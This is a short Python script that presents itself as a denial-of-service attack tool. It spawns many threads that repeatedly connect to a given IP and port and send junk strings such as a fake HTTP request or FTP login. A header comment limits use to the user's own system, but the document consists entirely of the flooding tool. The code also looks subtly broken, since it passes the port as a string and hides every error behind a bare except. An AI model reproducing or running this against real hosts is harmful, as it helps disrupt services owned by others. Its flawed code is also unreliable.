#!/usr/bin/python3
# use this method only on your privat system!!! this method is not for officail use

import sys
import socket as s
from threading import Thread

def do_dos():
    while True:
        soc = s.socket(s.AF_INET, s.SOCK_STREAM)
        try:
            soc.connect((ip, port))
            if port == '80':
                soc.send(b'GET not_exist.html HTTP/1.1')

            elif port == '21':
                soc.send(b'USER not_existing')

            else:
                soc.send(b'This is a random string')

            print('[+] Sending DoS packet to {}:{}'.format(ip, port))

        except:
            print('[-] Could not connect to {}:{}'.format(ip, port))
        soc.close()

if len(sys.argv) != 4:
    print('Usage:')
    print('./' + sys.argv[0] + ' [ip] [port] [threads] \n')
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]
threads = int(sys.argv[3])

print('[+] Running DoS attack {}:{} with {} threads'.format(ip, port, threads))
for i in range(0, threads):
    t = Thread(target=do_dos)
    t.start()